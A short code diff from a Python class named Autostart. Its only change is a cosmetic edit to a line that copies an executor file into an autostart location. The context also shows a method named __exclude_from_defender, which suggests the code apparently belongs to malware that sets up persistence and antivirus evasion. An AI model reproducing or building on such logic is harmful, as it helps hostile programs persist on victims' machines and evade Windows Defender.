@@ -29,7 +29,7 @@ class Autostart:
         if path.exists(self.__autostart_path):
             remove(self.__autostart_path)
 
-        copyfile(self.__executor_path, self.__autostart_path, )
+        copyfile(self.__executor_path, self.__autostart_path)
 
     def __exclude_from_defender(self) -> None:
         """
